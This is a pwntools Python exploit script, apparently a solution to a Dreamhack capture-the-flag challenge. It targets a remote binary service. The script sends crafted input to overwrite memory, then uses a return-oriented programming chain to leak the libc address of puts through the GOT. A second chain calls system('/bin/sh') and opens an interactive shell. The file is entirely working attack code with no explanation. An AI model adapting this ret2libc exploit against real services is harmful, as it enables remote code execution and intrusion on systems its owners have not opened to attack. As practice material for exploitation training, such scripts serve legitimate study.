#!/usr/bin/env python3
from pwn import *

PORT = 12535
HOST = "host3.dreamhack.games"
elf = context.binary = ELF('./prob_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            set resolve-heap-via-heuristic force
            b* 0x0000000000401488
            b* 0x00000000004014CA
            b* 0x0000000000401517
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return elf.process()

p = conn()

def sla(pr, dt): p.sendlineafter(pr, dt)
def sa(pr, dt): p.sendafter(pr, dt)
def s(dt): p.send(dt)


# GDB()

sa(b"detective's heart.\n> ", b'Decision2Solve'.ljust(16, b'\x00'))
pl = p64(0x404010) + p64(0x401446)[:6]
s(pl)
for i in range(1020):
    sla(b'> ', b'1')
    sa(b"detective's heart.\n> ", b'A' * 16)

# GDB()
sla(b'> ', b'2')

pop_rdi_rbp_ret = 0x40129b

pl = flat(
    b'A'*0x28,
    pop_rdi_rbp_ret,
    elf.got.puts,
    0,
    elf.plt.puts,
    0x401426
    )

s(pl.ljust(0x10000, b'\x00'))
libc.address = u64(p.recvline().strip().ljust(8, b'\x00')) - libc.sym.puts

pl = flat(
    b'A'*0x28,
    libc.address + 0x000000000002a3e5,
    next(libc.search(b'/bin/sh\0')),
    libc.sym.system
    )
# GDB()
s(pl.ljust(0x10000, b'\x00'))



p.interactive()